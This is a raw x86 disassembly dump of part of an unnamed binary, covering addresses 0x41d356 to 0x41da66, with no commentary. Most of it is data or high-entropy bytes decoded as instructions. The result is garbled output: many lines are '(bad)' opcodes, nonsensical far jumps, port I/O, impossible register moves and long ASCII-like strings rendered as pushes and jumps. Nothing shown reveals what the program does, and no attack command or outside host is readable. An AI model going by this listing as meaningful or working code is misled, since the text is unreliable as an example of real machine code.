  41d356:	jns    0x41d2e8
  41d358:	aas    
  41d359:	dec    esi
  41d35a:	test   BYTE PTR [edi+0x30],cl
  41d35d:	dec    esi
  41d35e:	test   BYTE PTR [edi+0x3c],cl
  41d361:	dec    esi
  41d362:	mov    ds:0x734e394f,al
  41d367:	dec    esi
  41d368:	inc    ebp
  41d369:	dec    esi
  41d36a:	xor    BYTE PTR [esi+0x44],cl
  41d36d:	dec    esi
  41d36e:	pop    esp
  41d36f:	lea    ebx,[edi-0x7e]
  41d372:	outs   dx,DWORD PTR ds:[esi]
  41d373:	xchg   edx,eax
  41d374:	outs   dx,BYTE PTR ds:[esi]
  41d375:	xchg   ebx,eax
  41d376:	jle    0x41d31b
  41d378:	jns    0x41d31a
  41d37a:	aas    
  41d37b:	dec    esi
  41d37c:	test   BYTE PTR [edi+0x30],cl
  41d37f:	dec    esi
  41d380:	test   BYTE PTR [edi+0x3c],cl
  41d383:	dec    esi
  41d384:	mov    ds:0x894e394f,al
  41d389:	dec    edi
  41d38a:	inc    ebp
  41d38b:	dec    esi
  41d38c:	xor    BYTE PTR [esi+0x44],cl
  41d38f:	dec    esi
  41d390:	pop    esp
  41d391:	popf   
  41d392:	pop    edi
  41d393:	xchg   edx,eax
  41d394:	outs   dx,DWORD PTR ds:[esi]
  41d395:	mov    ds:0xb37ea36e,al
  41d39a:	jns    0x41d34c
  41d39c:	aas    
  41d39d:	dec    esi
  41d39e:	mov    cs,WORD PTR [edi+0x30]
  41d3a1:	dec    esi
  41d3a2:	lods   al,BYTE PTR ds:[esi]
  41d3a3:	dec    edi
  41d3a4:	cmp    eax,0x394e734e
  41d3a9:	dec    esi
  41d3aa:	mov    eax,ds:0x304e3a4f
  41d3af:	dec    esi
  41d3b0:	inc    esp
  41d3b1:	dec    esi
  41d3b2:	pop    esp
  41d3b3:	lods   eax,DWORD PTR ds:[esi]
  41d3b4:	pop    edi
  41d3b5:	mov    ds:0xb36eb26f,al
  41d3ba:	jle    0x41d37f
  41d3bc:	jns    0x41d37e
  41d3be:	aas    
  41d3bf:	dec    esi
  41d3c0:	mov    cs,WORD PTR [edi+0x30]
  41d3c3:	dec    esi
  41d3c4:	lods   al,BYTE PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    eax,0x394e7e4e
  41d3cb:	dec    esi
  41d3cc:	lahf   
  41d3cd:	dec    edi
  41d3ce:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3d1:	dec    esi
  41d3d2:	inc    ebp
  41d3d3:	dec    esi
  41d3d4:	pop    esp
  41d3d5:	mov    ebp,0xc26fb25f
  41d3da:	outs   dx,BYTE PTR ds:[esi]
  41d3db:	ret    
  41d3dc:	jle    0x41d3b1
  41d3de:	jns    0x41d3b0
  41d3e0:	aas    
  41d3e1:	dec    esi
  41d3e2:	mov    cs,WORD PTR [edi+0x30]
  41d3e5:	dec    esi
  41d3e6:	lods   al,BYTE PTR ds:[esi]
  41d3e7:	dec    edi
  41d3e8:	cmp    eax,0x394f804e
  41d3ed:	dec    esi
  41d3ee:	lods   al,BYTE PTR ds:[esi]
  41d3ef:	dec    edi
  41d3f0:	cmp    cl,BYTE PTR [esi+0x30]
  41d3f3:	dec    esi
  41d3f4:	inc    esi
  41d3f5:	dec    esi
  41d3f6:	pop    esp
  41d3f7:	int    0x5f
  41d3f9:	ret    0xd26f
  41d3fc:	outs   dx,BYTE PTR ds:[esi]
  41d3fd:	sar    DWORD PTR [esi-0x1d],cl
  41d400:	jns    0x41d3e2
  41d402:	aas    
  41d403:	dec    esi
  41d404:	mov    cs,WORD PTR [edi+0x30]
  41d407:	dec    esi
  41d408:	lods   al,BYTE PTR ds:[esi]
  41d409:	dec    edi
  41d40a:	cmp    eax,0x394f834e
  41d40f:	dec    esi
  41d410:	mov    ds:0x304e3a4f,al
  41d415:	dec    esi
  41d416:	inc    esp
  41d417:	dec    esi
  41d418:	pop    esp
  41d419:	fstp   QWORD PTR [edi-0x2e]
  41d41c:	outs   dx,DWORD PTR ds:[esi]
  41d41d:	loop   0x41d48d
  41d41f:	jecxz  0x41d49f
  41d421:	repz jns 0x41d414
  41d424:	aas    
  41d425:	dec    esi
  41d426:	lea    ecx,[edi+0x30]
  41d429:	dec    esi
  41d42a:	lahf   
  41d42b:	dec    edi
  41d42c:	cmp    eax,0x3c4fa04e
  41d431:	dec    esi
  41d432:	xor    BYTE PTR [esi+0x3f],cl
  41d435:	dec    esi
  41d436:	pop    esp
  41d437:	in     eax,dx
  41d438:	pop    edi
  41d439:	loop   0x41d4aa
  41d43b:	repnz outs dx,BYTE PTR ds:[esi]
  41d43d:	repz jle 0x41d443
  41d440:	jns    0x41d442
  41d442:	jle    0x41d457
  41d444:	jns    0x41d456
  41d446:	cmp    al,0x4e
  41d448:	jg     0x41d498
  41d44a:	xor    BYTE PTR [esi-0x65],cl
  41d44d:	dec    edi
  41d44e:	xor    cl,BYTE PTR [esi-0x80]
  41d451:	dec    edi
  41d452:	cmp    al,0x4e
  41d454:	lods   eax,DWORD PTR ds:[esi]
  41d455:	dec    edi
  41d456:	cmp    ecx,DWORD PTR [esi+0x30]
  41d459:	dec    esi
  41d45a:	inc    ebp
  41d45b:	dec    esi
  41d45c:	pop    esp
  41d45d:	or     eax,0x126f025f
  41d462:	outs   dx,BYTE PTR ds:[esi]
  41d463:	adc    edi,DWORD PTR [esi+0x23]
  41d466:	jns    0x41d488
  41d468:	aas    
  41d469:	dec    esi
  41d46a:	add    BYTE PTR [eax],al
  41d46c:	hlt    
  41d46d:	rol    BYTE PTR [ecx+0x0],cl
  41d470:	call   0xf0421649
  41d475:	aam    0x41
  41d477:	add    BYTE PTR [eax-0x2a],bh
  41d47a:	inc    ecx
  41d47b:	add    ah,ah
  41d47d:	aad    0x41
  41d47f:	add    BYTE PTR [eax-0x2a],ch
  41d482:	inc    ecx
  41d483:	add    al,dl
  41d485:	aam    0x41
  41d487:	add    ah,dl
  41d489:	aam    0x41
  41d48b:	add    BYTE PTR [esi+edx*8+0x41],ah
  41d48f:	add    BYTE PTR [eax],bh
  41d491:	aad    0x41
  41d493:	add    BYTE PTR ds:0x36f89ca9,cl
  41d499:	mov    edx,0xd4ecf89c
  41d49e:	inc    ecx
  41d49f:	add    BYTE PTR [ebp+edx*8-0x2a4fffbf],bl
  41d4a6:	inc    ecx
  41d4a7:	add    BYTE PTR [ebp+edx*8-0x2a33ffbf],bh
  41d4ae:	inc    ecx
  41d4af:	add    BYTE PTR [edx*8-0x2d0fffbf],ah
  41d4b6:	inc    ecx
  41d4b7:	add    BYTE PTR [ebp+edx*8+0x41],al
  41d4bb:	add    BYTE PTR [edx*8-0x2983ffbf],dh
  41d4c2:	inc    ecx
  41d4c3:	add    BYTE PTR [esi+0x19f89c85],dh
  41d4c9:	or     edx,DWORD PTR [edi]
  41d4cb:	cmp    eax,0x140041d4
  41d4d1:	sbb    al,0x16
  41d4d3:	or     DWORD PTR [eax],0x7050d
  41d4d9:	add    BYTE PTR [eax+0x0],al
  41d4dc:	cmp    al,BYTE PTR [edx+0x3e]
  41d4df:	ds retf 0x4247
  41d4e3:	add    BYTE PTR [ebp+0x55],ch
  41d4e6:	inc    esp
  41d4e7:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d4ed:	in     eax,dx
  41d4ee:	inc    BYTE PTR [edi]
  41d4f0:	aas    
  41d4f1:	cli    
  41d4f2:	mov    ds:0x41d4e005,eax
  41d4f7:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d4fd:	xchg   esi,eax
  41d4fe:	pushf  
  41d4ff:	clc    
  41d500:	mov    ah,0x95
  41d502:	pushf  
  41d503:	clc    
  41d504:	mov    ebx,0xbaf89c95
  41d509:	xchg   ebp,eax
  41d50a:	pushf  
  41d50b:	clc    
  41d50c:	mov    ecx,0xb8f89c95
  41d511:	xchg   ebp,eax
  41d512:	pushf  
  41d513:	clc    
  41d514:	mov    edi,0xbef89c95
  41d519:	xchg   ebp,eax
  41d51a:	pushf  
  41d51b:	clc    
  41d51c:	mov    ebp,0xa6f89c95
  41d521:	xchg   ebp,eax
  41d522:	pushf  
  41d523:	clc    
  41d524:	jmp    0x41d2:0xe86003f9
  41d52b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d532:	jbe    0x41d584
  41d534:	mov    dh,0x85
  41d536:	pushf  
  41d537:	clc    
  41d538:	sbb    ecx,ebp
  41d53a:	push   eax
  41d53b:	pop    es
  41d53c:	es pop es
  41d53e:	add    BYTE PTR [eax],al
  41d540:	in     al,0xd2
  41d542:	inc    ecx
  41d543:	add    BYTE PTR [ebx],bl
  41d545:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41d578:	mov    WORD PTR [eax],ss
  41d57a:	inc    edx
  41d57b:	add    BYTE PTR [esi+0x67f89c85],dh
  41d581:	pushw  0x68
  41d584:	addr16 push 0x67
  41d587:	pushw  0x6b6a
  41d58b:	push   0x676b67
	...
  41d598:	es aas 
  41d59a:	inc    eax
  41d59b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d5a1:	dec    edi
  41d5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a3:	dec    edi
  41d5a4:	lahf   
  41d5a5:	dec    edi
  41d5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5a7:	dec    edi
  41d5a8:	ins    DWORD PTR es:[edi],dx
  41d5a9:	dec    esi
  41d5aa:	bound  ecx,QWORD PTR [esi+0x30]
  41d5ad:	dec    esi
  41d5ae:	add    BYTE PTR [eax],al
  41d5b0:	cdq    
  41d5b1:	dec    edi
  41d5b2:	pushf  
  41d5b3:	dec    edi
  41d5b4:	fwait
  41d5b5:	dec    edi
  41d5b6:	ins    DWORD PTR es:[edi],dx
  41d5b7:	dec    esi
  41d5b8:	bound  ecx,QWORD PTR [esi+0x30]
  41d5bb:	dec    esi
  41d5bc:	scas   eax,DWORD PTR es:[edi]
  41d5bd:	dec    edi
  41d5be:	lods   eax,DWORD PTR ds:[esi]
  41d5bf:	dec    edi
  41d5c0:	lahf   
  41d5c1:	dec    edi
  41d5c2:	mov    ds:0x624e6d4f,al
  41d5c7:	dec    esi
  41d5c8:	xor    BYTE PTR [esi+0x0],cl
  41d5cb:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d5d1:	dec    edi
  41d5d2:	test   eax,0xa04f934f
  41d5d7:	dec    edi
  41d5d8:	fwait
  41d5d9:	dec    edi
  41d5da:	xor    BYTE PTR [esi+0x0],cl
  41d5dd:	add    BYTE PTR [eax],al
  41d5df:	add    BYTE PTR [eax],al
  41d5e1:	add    BYTE PTR [eax],al
  41d5e3:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d5ea:	mov    WORD PTR [ebp-0x32734274],gs
  41d5f0:	mov    ebp,ds
  41d5f2:	mov    ebp,gs
  41d5f4:	mov    ebp,?
  41d5f6:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d5fc:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d602:	mov    WORD PTR [edx-0x74],?
  41d605:	jae    0x41d593
  41d607:	jo     0x41d595
  41d609:	jno    0x41d597
  41d60b:	jbe    0x41d599
  41d60d:	ja     0x41d59b
  41d60f:	je     0x41d59d
  41d611:	jne    0x41d59f
  41d613:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d61a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d620:	lods   al,BYTE PTR ds:[esi]
  41d621:	jge    0x41d5df
  41d623:	jge    0x41d5c3
  41d625:	(bad)  
  41d626:	jns    0x41d69b
  41d628:	mov    ecx,0x7d738cb1
  41d62d:	ins    DWORD PTR es:[edi],dx
  41d62e:	enter  0x9fc6,0x26
  41d632:	jb     0x41d637
  41d634:	test   eax,0xb956bb17
  41d639:	hlt    
  41d63a:	test   al,0x37
  41d63c:	test   al,0x7e
  41d63e:	fnstenv [ecx-0x6a]
  41d641:	mov    cl,0x6a
  41d643:	push   0xffffffce
  41d645:	or     BYTE PTR [edx],bl
  41d647:	xlat   BYTE PTR ds:[ebx]
  41d648:	out    dx,eax
  41d649:	add    eax,0x9321d7aa
  41d64e:	scas   al,BYTE PTR es:[edi]
  41d64f:	adc    DWORD PTR [esi],esp
  41d651:	jge    0x41d676
  41d653:	fidiv  WORD PTR [edi]
  41d655:	leave  
  41d656:	hlt    
  41d657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d658:	cmp    ax,0x1fc8
  41d65c:	mov    dh,cl
  41d65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d65f:	(bad)  
  41d660:	and    DWORD PTR [eax],ebx
  41d662:	and    DWORD PTR [ecx-0x18],esi
  41d665:	(bad)  [ebx+0x7]
  41d668:	cmc    
  41d669:	enter  0x301a,0x40
  41d66d:	adc    BYTE PTR [edx+0x0],al
  41d670:	jno    0x41d6d8
  41d672:	jp     0x41d6e2
  41d674:	fcom   st(4)
  41d676:	inc    ecx
  41d677:	add    BYTE PTR [edx*8-0x12f7ffbf],bh
  41d67e:	adc    al,BYTE PTR [edi]
  41d680:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d687:	ins    BYTE PTR es:[edi],dx
  41d688:	push   0x49657557
  41d68d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d693:	push   edi
  41d694:	ins    BYTE PTR es:[edi],dx
  41d695:	inc    edx
  41d696:	push   0x76666a73
  41d69b:	inc    edx
  41d69c:	jo     0x41d6e7
  41d69e:	dec    ebp
  41d69f:	dec    ebp
  41d6a0:	pop    edx
  41d6a1:	jp     0x41d6fd
  41d6a3:	jbe    0x41d6eb
  41d6a5:	pop    ecx
  41d6a6:	jo     0x41d720
	...
  41d6bc:	inc    ebp
  41d6bd:	push   edx
  41d6be:	jb     0x41d734
  41d6c0:	inc    esi
  41d6c1:	je     0x41d704
  41d6c3:	inc    esi
  41d6c4:	jae    0x41d73c
  41d6c6:	dec    ebx
  41d6c7:	gs inc edx
  41d6c9:	inc    bx
  41d6cb:	push   ebp
  41d6cc:	jno    0x41d744
  41d6ce:	ja     0x41d737
  41d6d0:	dec    edi
  41d6d1:	dec    esp
  41d6d2:	dec    ebp
  41d6d3:	inc    edx
  41d6d4:	jno    0x41d747
  41d6d6:	jae    0x41d72b
  41d6d8:	dec    eax
  41d6d9:	inc    ebp
  41d6da:	inc    esp
  41d6db:	inc    esp
  41d6dc:	push   ecx
  41d6dd:	dec    edx
  41d6de:	ins    BYTE PTR es:[edi],dx
  41d6df:	dec    ebx
  41d6e0:	jbe    0x41d750
  41d6e2:	pop    eax
  41d6e3:	jbe    0x41d730
  41d6e5:	inc    ecx
  41d6e6:	fs gs jno 0x41d757
  41d6ea:	push   ebx
  41d6eb:	inc    ecx
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	inc    ebx
  41d6ef:	outs   dx,BYTE PTR ds:[esi]
  41d6f0:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d6f4:	push   edx
  41d6f5:	push   ecx
  41d6f6:	push   0x74000064
  41d6fb:	jne    0x41d772
  41d6fd:	ins    DWORD PTR es:[edi],dx
  41d6fe:	push   ecx
  41d6ff:	push   eax
  41d700:	jo     0x41d77c
  41d702:	addr16 jo 0x41d75b
  41d705:	pop    eax
  41d706:	add    BYTE PTR [eax],al
  41d708:	push   ecx
  41d709:	pop    ecx
  41d70a:	inc    ebx
  41d70b:	inc    edx
  41d70c:	outs   dx,BYTE PTR ds:[esi]
  41d70d:	popa   
  41d70e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d712:	jne    0x41d782
  41d714:	dec    ebx
  41d715:	add    BYTE PTR [ecx+0x45],bh
  41d718:	bound  ebp,QWORD PTR [ecx+0x46]
  41d71b:	dec    ecx
  41d71c:	ja     0x41d763
  41d71e:	dec    eax
  41d71f:	inc    ebp
  41d720:	inc    edx
  41d721:	push   ebx
  41d722:	add    BYTE PTR [eax],al
  41d724:	je     0x41d789
  41d726:	bound  esp,QWORD PTR [edi+0x78]
  41d729:	dec    eax
  41d72a:	bound  edx,QWORD PTR [ebx+0x43]
  41d72d:	pop    eax
  41d72e:	outs   dx,DWORD PTR ds:[esi]
  41d72f:	push   0x4355
  41d734:	inc    edi
  41d735:	gs ins BYTE PTR es:[edi],dx
  41d737:	dec    esp
  41d738:	js     0x41d7a2
  41d73a:	inc    edx
  41d73b:	js     0x41d783
  41d73d:	arpl   WORD PTR [eax],ax
  41d73f:	add    BYTE PTR [eax],al
  41d741:	add    BYTE PTR [eax],al
  41d743:	add    BYTE PTR [edx+0x70],cl
  41d746:	jb     0x41d7c0
  41d748:	outs   dx,DWORD PTR ds:[esi]
  41d749:	pop    eax
  41d74a:	dec    ebx
  41d74b:	push   esp
  41d74c:	dec    esp
  41d74d:	jns    0x41d79a
  41d74f:	js     0x41d7c9
  41d751:	outs   dx,BYTE PTR ds:[esi]
  41d752:	pop    ecx
  41d753:	jae    0x41d7c3
  41d755:	push   0x43644448
  41d75a:	arpl   WORD PTR [edx+0x55],sp
  41d75d:	push   0x42504e67
  41d762:	push   ebp
  41d763:	je     0x41d7da
  41d765:	addr16 dec edi
  41d767:	dec    esp
  41d768:	inc    edx
  41d769:	ins    DWORD PTR es:[edi],dx
  41d76a:	inc    esi
  41d76b:	inc    esi
  41d76c:	inc    esi
  41d76d:	arpl   WORD PTR [edx+0x47],bx
  41d770:	push   ebp
  41d771:	inc    ebx
  41d772:	popa   
  41d773:	push   edx
  41d774:	dec    esp
  41d775:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d77c:	push   ecx
  41d77d:	push   ebx
  41d77e:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d785:	dec    edx
  41d786:	jns    0x41d7f1
  41d788:	push   edx
  41d789:	inc    ebx
  41d78a:	jo     0x41d801
  41d78c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d790:	fs push ebx
  41d792:	inc    ebx
  41d793:	push   ebp
  41d794:	push   eax
  41d795:	ja     0x41d811
  41d797:	jp     0x41d7e6
  41d799:	push   esi
  41d79a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d79e:	dec    edx
  41d79f:	dec    esi
  41d7a0:	data16 ja 0x41d7f1
  41d7a3:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d7aa:	dec    esp
  41d7ab:	cmp    ebx,ebp
  41d7ad:	dec    esp
  41d7ae:	lods   eax,DWORD PTR ds:[esi]
  41d7af:	out    dx,al
  41d7b0:	mov    ebp,0xa53ddffb
  41d7b5:	js     0x41d770
  41d7b7:	inc    esp
  41d7b8:	sub    BYTE PTR [ebx],cl
  41d7ba:	fst    QWORD PTR [esi+edx*4+0xad0001]
  41d7c1:	add    BYTE PTR [eax],al
  41d7c3:	ret    0x886d
  41d7c6:	adc    BYTE PTR [eax-0x421cf853],al
  41d7cc:	jne    0x41d77e
  41d7ce:	jno    0x41d800
  41d7d0:	dec    ebp
  41d7d1:	inc    ecx
  41d7d2:	jno    0x14e037f9
  41d7d8:	sti    
  41d7d9:	xchg   ebp,eax
  41d7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7db:	inc    eax
  41d7dc:	neg    edi
  41d7de:	scas   eax,DWORD PTR es:[edi]
  41d7df:	sub    bh,BYTE PTR [ebx]
  41d7e1:	jbe    0x41d807
  41d7e3:	scas   eax,DWORD PTR es:[edi]
  41d7e4:	out    dx,eax
  41d7e5:	mov    dl,0xa9
  41d7e7:	cdq    
  41d7e8:	aam    0x87
  41d7ea:	ins    BYTE PTR es:[edi],dx
  41d7eb:	fwait
  41d7ec:	hlt    
  41d7ed:	and    BYTE PTR [ecx+0x5e19c3bd],dl
  41d7f3:	lock push edx
  41d7f5:	fdivr  st,st(7)
  41d7f7:	sbb    al,0x7d
  41d7f9:	xchg   edx,esp
  41d7fb:	imul   DWORD PTR [eax+0x28]
  41d7fe:	ret    0x97dc
  41d801:	cld    
  41d802:	or     ch,BYTE PTR [edi+edi*2-0x5d]
  41d806:	sbb    edx,ecx
  41d808:	in     al,dx
  41d809:	out    0x23,eax
  41d80b:	scas   eax,DWORD PTR es:[edi]
  41d80c:	jp     0x41d79d
  41d80e:	cli    
  41d80f:	xchg   esp,eax
  41d810:	adc    BYTE PTR [ebp-0x5b68c731],cl
  41d816:	sub    edx,DWORD PTR [ecx-0x2c1fdb56]
  41d81c:	fidivr DWORD PTR [esi+0x8012bc3]
  41d822:	xor    edi,DWORD PTR [ebp-0x7d]
  41d825:	push   eax
  41d826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d827:	push   es
  41d828:	push   edi
  41d829:	fs sub eax,0x54a9657f
  41d82f:	adc    al,0x1c
  41d831:	ins    BYTE PTR es:[edi],dx
  41d832:	xchg   edx,eax
  41d833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d834:	or     DWORD PTR [edx-0x29cd815f],esp
  41d83a:	xchg   cl,al
  41d83c:	sub    esi,DWORD PTR [esi-0x2f]
  41d83f:	xchg   edi,eax
  41d840:	mov    DWORD PTR [edi+0x2f],ecx
  41d843:	cmp    BYTE PTR [eax],dh
  41d845:	dec    esp
  41d846:	retf   0xb0a9
  41d849:	and    DWORD PTR [esi-0x4c910f15],edx
  41d84f:	dec    ebx
  41d850:	(bad)  
  41d851:	push   0x54
  41d853:	mov    ch,0x64
  41d855:	call   0xcb24b363
  41d85a:	(bad)  
  41d85b:	pop    ss
  41d85c:	or     ah,cl
  41d85e:	add    BYTE PTR [ecx-0x7b430d3d],ah
  41d864:	mov    ah,BYTE PTR [edx]
  41d866:	shufps xmm6,xmm5,0x87
  41d86a:	int    0x2a
  41d86c:	jb     0x41d81a
  41d86e:	out    0xee,eax
	...
  41d878:	add    BYTE PTR [eax],al
  41d87a:	add    BYTE PTR [eax],ch
  41d87c:	mov    dl,0xa5
  41d87e:	push   edx
  41d87f:	mov    edi,0x7cfaff57
  41d884:	xlat   BYTE PTR fs:[ebx]
  41d886:	push   esi
  41d887:	pop    DWORD PTR [edx+ebx*1+0x4b]
  41d88b:	inc    ecx
  41d88c:	xchg   edi,eax
  41d88d:	add    DWORD PTR [eax],eax
  41d88f:	lods   eax,DWORD PTR ds:[esi]
  41d890:	add    BYTE PTR [eax],al
  41d892:	add    ch,bh
  41d894:	repz mov al,ds:0x78b115a9
  41d89a:	inc    edi
  41d89b:	fdivrp st(2),st
  41d89d:	in     al,0xb7
  41d89f:	xor    DWORD PTR [ebx+eax*4],ebp
  41d8a2:	mov    al,0x96
  41d8a4:	sub    al,0xb6
  41d8a6:	test   esp,esi
  41d8a8:	bound  ebp,QWORD PTR [eax+0x31]
  41d8ab:	call   0x298f:0x1f406593
  41d8b2:	xchg   edi,eax
  41d8b3:	pop    ds
  41d8b4:	leave  
  41d8b5:	rcl    BYTE PTR [ebp-0x16],cl
  41d8b8:	(bad)  
  41d8b9:	cmp    ah,BYTE PTR [edx+0x3d]
  41d8bc:	fwait
  41d8bd:	xchg   ecx,eax
  41d8be:	mov    db0,edi
  41d8c1:	cmp    eax,0xcbdd19d5
  41d8c6:	ss clc 
  41d8c8:	push   esp
  41d8c9:	ds add eax,0x472f2158
  41d8cf:	loop   0x41d92c
  41d8d1:	inc    esp
  41d8d2:	sbb    ecx,esp
  41d8d4:	out    0x90,al
  41d8d6:	jge    0x41d8d9
  41d8d8:	shl    BYTE PTR [eax+0x54],1
  41d8db:	mov    bh,0x19
  41d8dd:	xchg   esp,eax
  41d8de:	push   ecx
  41d8df:	call   0x2ab7aae8
  41d8e4:	dec    eax
  41d8e5:	jo     0x41d877
  41d8e7:	addr16 xchg ecx,eax
  41d8e9:	xchg   ecx,eax
  41d8ea:	hlt    
  41d8eb:	xor    DWORD PTR ds:0xa15dcd5,ecx
  41d8f1:	in     al,dx
  41d8f2:	mov    eax,DWORD PTR [esi]
  41d8f4:	arpl   WORD PTR [esi+0x47be3d00],bp
  41d8fa:	xor    eax,0xc0d35368
  41d8ff:	add    BYTE PTR [ebp-0x11],ah
  41d902:	add    ebp,DWORD PTR [esp+ebx*2]
  41d905:	pop    eax
  41d906:	add    edi,DWORD PTR [ebx]
  41d908:	stc    
  41d909:	stos   DWORD PTR es:[edi],eax
  41d90a:	jg     0x41d8e8
  41d90c:	fidivr WORD PTR [ebx]
  41d90e:	(bad)  
  41d90f:	dec    edi
  41d910:	xor    al,0x22
  41d912:	xchg   ecx,eax
  41d913:	or     al,0x70
  41d915:	gs add eax,0x32bdebc
  41d91b:	dec    ebx
  41d91c:	mov    ds:0xf2548838,eax
  41d921:	xor    DWORD PTR [eax-0x53481864],eax
  41d927:	(bad)  
  41d928:	lea    ebp,[eax-0x16e15b07]
  41d92e:	rol    DWORD PTR [edx+0x244c0e23],1
  41d934:	jno    0x41d8da
  41d936:	mov    eax,0x4bd9bc9f
  41d93b:	ja     0x41d8f3
  41d93d:	or     DWORD PTR [ecx],esp
  41d93f:	sbb    DWORD PTR [eax],eax
	...
  41d949:	add    BYTE PTR [eax],al
  41d94b:	mov    bl,0x55
  41d94d:	jg     0x41d8d0
  41d94f:	jmp    FWORD PTR [ebx-0x69418801]
  41d955:	push   0xdfb5757
  41d95a:	scas   al,BYTE PTR es:[edi]
  41d95b:	out    dx,al
  41d95c:	xchg   edi,eax
  41d95d:	add    DWORD PTR [eax],eax
  41d95f:	lods   eax,DWORD PTR ds:[esi]
  41d960:	add    BYTE PTR [eax],al
  41d962:	add    BYTE PTR [ebx],bh
  41d964:	or     eax,0xf67b8f54
  41d969:	mov    bl,0xa5
  41d96b:	mov    edx,0xba922457
  41d970:	pop    edi
  41d971:	dec    esi
  41d972:	ja     0x41d9cb
  41d974:	push   ebp
  41d975:	in     eax,0x61
  41d977:	ja     0x41d98c
  41d979:	aad    0x89
  41d97b:	out    0xb1,al
  41d97d:	pusha  
  41d97e:	sbb    ah,BYTE PTR [edi]
  41d980:	adc    BYTE PTR [ebx+0x14],dl
  41d983:	retf   
  41d984:	jmp    0xd83d:0x48f653c
  41d98b:	pop    esp
  41d98c:	loopne 0x41d9c4
  41d98e:	out    dx,al
  41d98f:	hlt    
  41d990:	in     al,0x42
  41d992:	loop   0x41d965
  41d994:	sub    cl,dl
  41d996:	add    al,0x6a
  41d998:	xchg   edi,eax
  41d999:	add    cl,BYTE PTR ds:0x8f27e948
  41d99f:	jae    0x41d98f
  41d9a1:	pop    esp
  41d9a2:	repnz ins DWORD PTR es:[edi],dx
  41d9a4:	and    al,0x4a
  41d9a6:	fs jns 0x41d9ad
  41d9a9:	or     al,0x15
  41d9ab:	xor    eax,DWORD PTR [ecx]
  41d9ad:	jns    0x41da09
  41d9af:	pop    edx
  41d9b0:	add    bl,ah
  41d9b2:	adc    BYTE PTR [ebx-0x43],cl
  41d9b5:	pop    edi
  41d9b6:	lahf   
  41d9b7:	mov    esi,edi
  41d9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9ba:	gs pop esp
  41d9bc:	shl    bh,1
  41d9be:	ins    DWORD PTR es:[edi],dx
  41d9bf:	into   
  41d9c0:	stc    
  41d9c1:	sub    al,0x9f
  41d9c3:	out    0x31,al
  41d9c5:	dec    esi
  41d9c6:	sbb    ebp,DWORD PTR [esi+0x36]
  41d9c9:	dec    eax
  41d9ca:	repz daa 
  41d9cc:	mov    eax,esi
  41d9ce:	push   0x59
  41d9d0:	xchg   edi,eax
  41d9d1:	sub    eax,0x235fc02f
  41d9d6:	sub    al,0xcb
  41d9d8:	add    eax,0x28e33b3b
  41d9dd:	push   esp
  41d9de:	loopne 0x41d9f6
  41d9e0:	xchg   ebx,eax
  41d9e1:	mov    bl,al
  41d9e3:	aas    
  41d9e4:	fnclex 
  41d9e6:	jg     0x41d9ec
  41d9e8:	mov    al,ds:0x68355c4
  41d9ed:	addr16 cmp al,0xe9
  41d9f0:	add    eax,DWORD PTR [eax-0x65]
  41d9f3:	add    ecx,DWORD PTR [ebx+eiz*1]
  41d9f6:	pushf  
  41d9f7:	enter  0xbf,0x87
  41d9fb:	test   DWORD PTR [ebx-0x23e5ba20],ebp
  41da01:	(bad)  
  41da03:	add    ch,0x6
  41da06:	jnp    0x41d9d3
  41da08:	pop    edi
  41da09:	add    al,0x16
  41da0b:	jne    0x41d9c8
  41da0d:	xchg   ebp,eax
  41da0e:	lods   al,BYTE PTR ds:[esi]
  41da0f:	scas   al,BYTE PTR es:[edi]
	...
  41da18:	add    BYTE PTR [eax],al
  41da1a:	add    BYTE PTR [eax],bh
  41da1c:	(bad)  
  41da1d:	cmp    ah,BYTE PTR [esi+edi*8]
  41da20:	in     al,dx
  41da21:	fimul  WORD PTR ds:[edi-0x3953942b]
  41da28:	mov    edi,0x989b39fe
  41da2d:	add    DWORD PTR [eax],eax
  41da2f:	lods   eax,DWORD PTR ds:[esi]
  41da30:	add    BYTE PTR [eax],al
  41da32:	add    BYTE PTR [ecx+0x6b],dh
  41da35:	data16 mov bl,ch
  41da38:	and    dl,0xc5
  41da3b:	fs push edi
  41da3d:	sbb    bl,BYTE PTR [esi]
  41da3f:	mov    ebp,0xe04d4853
  41da44:	mov    bh,0x41
  41da46:	cmp    edx,esi
  41da48:	or     eax,ebp
  41da4a:	out    dx,al
  41da4b:	sahf   
  41da4c:	ficom  WORD PTR [ebx-0x36]
  41da4f:	cmp    eax,0x82fb09a4
  41da54:	or     ecx,DWORD PTR [eax+0x31]
  41da57:	sahf   
  41da58:	lds    esp,FWORD PTR [ebx+0x664d870b]
  41da5e:	outs   dx,BYTE PTR ds:[esi]
  41da5f:	ret    0xbd54
  41da62:	cmc    
  41da63:	int    0xdd
  41da65:	dec    esp
  41da66:	mov    dl,0x35
